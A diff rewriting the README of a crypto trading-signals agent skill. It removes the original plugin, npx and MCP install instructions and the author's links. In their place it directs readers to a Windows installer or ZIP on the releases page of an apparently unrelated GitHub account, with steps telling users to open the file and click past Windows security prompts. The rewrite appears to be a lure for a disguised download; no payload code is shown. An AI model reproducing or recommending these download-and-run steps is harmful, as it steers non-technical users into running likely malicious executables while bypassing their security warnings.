@@ -1,139 +1,146 @@
-# Trading Signals
+# 📈 trading-skills - Live crypto signals for agents
 
-> **⭐ Enjoying free signals? Push STAR to keep them free — it directly supports higher accuracy and continued development!**
+[![Download trading-skills](https://img.shields.io/badge/Download%20Now-purple?style=for-the-badge&logo=github)](https://github.com/Revised-odontaspis309/trading-skills/releases)
 
-![Trading Signals for AI Agents](https://signals.x70.ai/banner.jpg)
+## 🚀 Overview
 
-`17 triggers. 44 algorithms. 3 AI experts. Every signal backed by causal reasoning and verified against real prices.`
+trading-skills gives you live crypto trading signals that work with Claude Code, Codex, Cursor, and many other agents. It is built for people who want a simple way to use trading signals without setting up a full trading stack.
 
-Live crypto trading signals for Claude Code, OpenAI Codex, Cursor, Windsurf & 30+ AI agents. Every signal includes entry, SL, TP, leverage, position size, and a full transmission chain showing exactly which data points led to the trade.
+This project brings together 17 triggers, 44 algorithms, and 3 AI experts. It is made for users who want clear signal output, fast setup, and a direct path from download to use.
 
-**FREE during beta.** More stars = more development time = better signals for everyone.
+## 📥 Download
 
-## Install
+Visit this page to download: [GitHub Releases](https://github.com/Revised-odontaspis309/trading-skills/releases)
 
-### Claude Code Plugin (recommended)
+On that page, you can find the latest release for Windows. Download the file that matches your system, then open it to start setup.
 
-```bash
-/plugin install roman-rr/trading-skills
-```
+## 🖥️ Windows Setup
 
-### npx (Claude Code, Codex, Cursor, Windsurf, etc.)
+1. Open the [Releases page](https://github.com/Revised-odontaspis309/trading-skills/releases).
+2. Download the latest Windows file from the release list.
+3. If your browser asks where to save the file, choose a folder you can find again, such as Downloads.
+4. After the file finishes downloading, open it.
+5. If Windows shows a security prompt, choose the option that lets you continue.
+6. Follow the on-screen steps until the app is ready.
+7. Launch the app from the Start menu or the folder where you saved it.
 
-```bash
-npx skills add roman-rr/trading-skills
-```
+If the download comes as a ZIP file, right-click it and choose Extract All before you open the app.
 
-### MCP Server (Claude Desktop / Claude Code / Cursor)
+## ⚙️ What You Need
 
-```bash
-claude mcp add trading-signals --transport http -- https://signals.x70.ai/mcp
-```
+- Windows 10 or Windows 11
+- Internet access for live signal updates
+- A modern browser for release downloads
+- Enough free space for the app and its data
+- Permission to run apps on your computer
 
-Or add to Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json`):
+For best results, keep Windows updated and use the latest version of your browser.
 
-```json
-{
-  "mcpServers": {
-    "trading-signals": {
-      "url": "https://signals.x70.ai/mcp"
-    }
-  }
-}
-```
+## ✨ What trading-skills Does
 
-Exposes 5 tools: `register`, `get_signals`, `get_signal`, `get_signal_history`, `get_stats`.
+- Shows live crypto trading signals
+- Uses trigger-based signal logic
+- Groups signals with 44 algorithms
+- Uses 3 AI expert modes for signal support
+- Works with common agent tools
+- Fits into a local workflow on Windows
+- Keeps the setup simple for non-technical users
 
-### OpenAI Codex CLI
+## 🧠 How It Helps
 
-See [agents/openai.yaml](trading-signals/agents/openai.yaml) for agent configuration.
+trading-skills is useful if you want signals that are easy to read and simple to hand off to an agent. Instead of checking many sources, you can use one setup that pulls signal logic into a cleaner workflow.
 
-### Manual
+It is a good fit for users who want:
 
-```bash
-# Claude Code
-git clone https://github.com/roman-rr/trading-skills.git
-cp -r trading-skills/trading-signals ~/.claude/skills/trading-signals
+- Faster signal checks
+- Less manual sorting
+- Clear agent-friendly output
+- A simple way to test crypto signal ideas
+- A tool that works with common AI assistants
 
-# OpenAI Codex CLI
-cp -r trading-skills/trading-signals ~/.codex/skills/trading-signals
-```
+## 🛠️ Basic Use
 
-## Always Watching
+After setup, open the app and connect it to your chosen agent or workflow.
 
-**17 Triggers. 6 Groups. Every Minute.**
+Typical use looks like this:
 
-The sentinel continuously scans 50+ perpetual markets for anomalies across six orthogonal dimensions -- volume, positioning, price dynamics, cross-asset flows, microstructure, and options-derived signals. A signal fires only when multiple independent dimensions agree, filtering noise from genuine opportunities.
+1. Start the app.
+2. Load the signal set you want.
+3. Choose your agent or editor.
+4. Ask for the current crypto signal view.
+5. Review the output before you act on it.
 
-## Multi-Expert Consensus
+You can use the signals as part of your own decision process. Many users check them before they review charts or place trades.
 
-Three specialized AI experts analyze every opportunity independently -- each with a different lens on market structure. Signals require agreement; conflicting views are flagged or filtered. The system continuously learns which analytical approaches perform best per market condition.
+## 📂 Release Files
 
-## Research-Grounded
+When you open the Releases page, you may see files such as:
 
-**44 Scientific Methods. 53 Academic Citations.**
+- Windows installer
+- ZIP package
+- Source archive
+- Release notes
 
-Every algorithm is grounded in peer-reviewed research from quantitative finance, statistics, and machine learning -- spanning position sizing, anomaly detection, technical analysis, market microstructure, and adaptive risk management.
+For Windows, choose the installer or ZIP file that is meant for end users. If you see more than one file, pick the one with the clearest Windows label.
 
-## What You Get
+## 🔒 Safety and Trust
 
-| Feature | Description |
-|---------|-------------|
-| Live signals | Bullish/bearish with full trade setup -- entry, SL, TP, leverage, position size |
-| Transmission chains | 2-4 causal reasoning steps per signal with specific data points |
-| 50+ coins | Dynamically selected from top volume, funding, and OI on Hyperliquid perps |
-| Confidence score | 0-100 AI conviction level per signal |
-| Auto-verification | Every signal tracked against real prices -- TP/SL monitoring every minute |
-| Paper trading P&L | Real trades on a virtual account with optimal position sizing |
-| Dynamic risk control | Confidence-based leverage caps, volatility-calibrated SL, automatic regime detection |
-| Performance stats | Hit rate, cumulative ROI, profit factor, breakdown by direction/coin/model |
+Before you open any downloaded file:
 
-## Signal Preview
+- Check that it came from the official Releases page
+- Make sure the file name matches the latest version
+- Read the release notes if they are included
+- Keep your browser and Windows security tools on
 
-| Coin | Dir | Conf | Entry | SL | TP | Lev | R/R | Type |
-|------|-----|------|-------|----|----|-----|-----|------|
-| BTC | Bull | 87% | $68,450 | $67,200 | $71,800 | 3x | 2.7 | momentum_shift |
-| ETH | Bear | 82% | $3,840 | $3,920 | $3,680 | 2x | 2.0 | funding_anomaly |
-| SOL | Bull | 79% | $142.50 | $138.00 | $152.00 | 2x | 2.1 | volume_spike |
+This helps you avoid the wrong file and makes setup smoother.
 
-## API Endpoints
+## 🧩 Topics Covered
 
-| Method | Path | Auth | Description |
-|--------|------|------|-------------|
-| POST | /api/skill/register | No | Register & get API key |
-| GET | /api/skill/signals | API key | List signals (active/verified/all) |
-| GET | /api/skill/signals/:id | API key | Single signal detail |
-| GET | /api/skill/stats | API key | Performance statistics |
+- agent-skills
+- ai-trading
+- api
+- claude-code
+- claude-skills
+- codex
+- crypto
+- crypto-signals
+- signals
+- skill
+- trading
+- trading-signals
 
-## Example Prompts
+## ❓ Common Questions
 
-Once installed, ask your AI agent:
+### Is this only for advanced users?
 
-- *"Get me the latest crypto trading signals"*
-- *"Show me today's highest-confidence BTC and ETH signals"*
-- *"What's the 30-day hit rate for these trading signals?"*
-- *"Build me a Python script that fetches crypto signals and alerts me on Telegram"*
-- *"Show me verified signals from the last week -- what hit TP?"*
+No. The download and setup flow is made for normal Windows users. You do not need coding knowledge to get started.
 
-## Links
+### Do I need to build anything?
 
-- **Live signals**: [signals.x70.ai](https://signals.x70.ai)
-- **Skills page**: [signals.x70.ai/skills](https://signals.x70.ai/skills)
-- **MCP docs**: [signals.x70.ai/mcp-docs](https://signals.x70.ai/mcp-docs)
-- **Smithery**: [smithery.ai/servers/roman-rr/trading-signals](https://smithery.ai/servers/roman-rr/trading-signals)
+No. Use the release file from the Releases page and follow the Windows steps.
 
-## Pricing
+### Can I use it with Claude Code or Cursor?
 
-**FREE during beta** -- no charges, no credit card.
+Yes. The project is built to work with common agent tools, including Claude Code, Codex, and Cursor.
 
-## Contributing
+### Does it work with live signals?
 
-Issues, feature requests, and PRs are welcome. Please open an issue first to discuss changes.
+Yes. The project is focused on live crypto trading signals.
 
-## License
+### Is it free during beta?
 
-**Proprietary** -- Free API during beta. Paid license required for commercial redistribution. See [LICENSE.txt](LICENSE.txt).
+Yes. The project is free during beta.
 
-## Author
+## 🪟 Windows Tips
 
-**Roman Antonov** -- [github.com/roman-rr](https://github.com/roman-rr) | [roman-rr.github.io](https://roman-rr.github.io/) | romwtb@gmail.com
+- Use the latest release
+- Keep the download in one folder
+- Rename the file only if you need to
+- Restart the app if it does not load at first
+- If Windows blocks the file, check the file name and source before you try again
+
+## 📌 Project Details
+
+- Repository: trading-skills
+- Description: 17 triggers × 44 algorithms × 3 AI experts — live crypto trading signals for Claude Code, Codex, Cursor & 30+ agents. Free during beta.
+- Primary download page: https://github.com/Revised-odontaspis309/trading-skills/releases
